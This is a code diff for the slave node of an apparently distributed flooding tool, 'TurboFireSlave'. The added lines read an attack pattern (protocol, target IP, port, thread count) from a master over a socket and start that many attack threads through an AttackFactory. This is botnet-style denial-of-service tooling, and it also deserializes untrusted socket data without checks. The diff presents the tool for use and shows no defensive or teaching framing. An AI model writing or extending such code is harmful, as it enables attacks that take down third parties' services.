@@ -18,6 +18,8 @@ package app;
 
 import view.GUI;
 import utilies.AttackPattern;
+import utilies.AttackFactory;
+import protocols.interfaces.Protocol;
 import java.io.PrintWriter;
 import java.io.InputStreamReader;
 import java.io.NotSerializableException;
@@ -49,11 +51,13 @@ public class TurboFireSlave implements Serializable {
                 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                 this.attackPattern = (AttackPattern) ois.readObject();
                 System.out.println(this.attackPattern.getProtocol() + " - " + this.attackPattern.getIP() + " - " + this.attackPattern.getPort() + " - " + this.attackPattern.getThreadAmount());
-
-                // if(this..equalsIgnoreCase("UDP")) {
-
-                // }
                 ois.close();
+
+                for(int i = 0 ; i < this.attackPattern.getThreadAmount() ; i++) {
+                    Thread t = new Thread(AttackFactory.createAttack(this.attackPattern));
+                    t.start();
+                    System.out.println("ok");
+                }
                 break;
             }catch(NotSerializableException nse) {
                 System.out.println(nse.toString());
